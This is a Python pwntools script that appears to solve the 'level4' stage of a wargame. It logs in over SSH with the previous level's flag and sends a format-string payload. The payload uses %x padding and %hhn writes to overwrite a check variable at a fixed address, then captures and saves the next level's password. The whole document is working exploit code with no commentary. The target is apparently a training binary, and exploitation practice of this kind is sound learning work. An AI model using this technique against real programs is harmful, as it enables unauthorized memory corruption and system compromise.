#!/usr/bin/python3

from pwn import *

host = '10.11.248.120'
port = 4242
user = 'level4'
password = open("../level3/flag", "rb").read()

with ssh(user=user, host=host, port=port, password=password) as s:

    p = s.process(["./level4"])

    def ssh_send(line):
        if type(line) == str:
            line = line.encode("utf-8")
        elif type(line) != bytes:
            print("[x] Wrong data format !")
            raise ValueError
        print(f"[x] Sending: {line!r}")
        p.sendline(line)

    def ssh_recv(timeout = 1.0) -> str:
        data = p.recv(timeout=timeout)
        text = data.decode(errors='ignore')
        print(f"[x] Received: {text!r}")
        return text

    def wait_for_shell():
        while True:
            output = ssh_recv()
            if output == "$ ":
                break
    
    try:
        
        CHECK   = 0x08049810
        MAGIC   = 0x01025544

        payload = b""
        payload += p32(CHECK) + b'    '
        payload += p32(CHECK + 1) + b'    '
        payload += p32(CHECK + 2) + b'    '
        payload += p32(CHECK + 3) + b'    '
        payload += b"%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%212x%hhn%17x%hhn%173x%hhn%255x%hhn"

        ssh_send(payload)
        ssh_recv()
        flag = ssh_recv().split('\n')[0]
    
    except ValueError:
        exit(1)

    print(f"\nlevel5 password: {flag}\n")

    flagfile = open("flag", "wb")
    flagfile.write(flag.encode("utf-8"))

    s.close()

